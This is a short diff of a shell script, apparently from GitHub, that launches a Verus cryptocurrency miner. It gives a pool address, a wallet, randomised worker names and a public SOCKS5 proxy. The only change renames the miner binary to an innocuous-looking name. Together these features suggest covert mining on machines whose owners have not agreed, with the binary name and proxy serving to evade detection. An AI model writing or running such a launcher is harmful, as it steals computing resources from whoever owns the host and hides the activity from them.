@@ -6,5 +6,5 @@ POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RT8DNmxnDDRCLScadn7efqKuDLFvrB9unv
 WORKER=$(echo $(shuf -i 1-10 -n 1)ojakk)
 PROXY=socks5://174.64.199.82:4145	
-./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+./hayu -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
 © 2021 GitHub, Inc.
